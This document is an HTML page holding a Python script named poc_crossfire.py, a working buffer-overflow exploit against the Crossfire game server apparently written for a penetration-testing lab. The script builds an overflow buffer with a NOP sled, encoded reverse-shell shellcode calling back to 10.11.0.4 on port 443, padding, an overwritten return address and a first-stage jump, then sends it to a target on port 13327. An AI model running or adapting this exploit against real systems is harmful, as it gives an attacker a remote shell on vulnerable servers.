<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>poc_crossfire.py</title>
</head><body>#!/usr/bin/python<br/>
import socket<br/>
<br/>
host = "10.11.0.128"<br/>
<br/>
nop_sled = "\x90" * 8<br/>
<br/>
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode<br/>
<br/>
shellcode = &nbsp;b""<br/>
shellcode += b"\xdb\xdb\xd9\x74\x24\xf4\x58\xbb\x77\x3a\x3a"<br/>
shellcode += b"\x7d\x29\xc9\xb1\x12\x31\x58\x17\x03\x58\x17"<br/>
shellcode += b"\x83\xb7\x3e\xd8\x88\x06\xe4\xeb\x90\x3b\x59"<br/>
shellcode += b"\x47\x3d\xb9\xd4\x86\x71\xdb\x2b\xc8\xe1\x7a"<br/>
shellcode += b"\x04\xf6\xc8\xfc\x2d\x70\x2a\x94\xa7\x89\xcc"<br/>
shellcode += b"\x60\xd0\x8f\xcc\x69\x9b\x19\x2d\xd9\xbd\x49"<br/>
shellcode += b"\xff\x4a\xf1\x69\x76\x8d\x38\xed\xda\x25\xad"<br/>
shellcode += b"\xc1\xa9\xdd\x59\x31\x61\x7f\xf3\xc4\x9e\x2d"<br/>
shellcode += b"\x50\x5e\x81\x61\x5d\xad\xc2"<br/>
<br/>
padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))<br/>
eip = "\x96\x45\x13\x08" # 0x08134596<br/>
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"<br/>
<br/>
buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"<br/>
<br/>
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
print "[*] Sending evil buffer..."<br/>
<br/>
s.connect((host, 13327))<br/>
print s.recv(1024)<br/>
<br/>
s.send(buffer)<br/>
s.close()<br/>
<br/>
print "[*] Payload sent!"</body></html>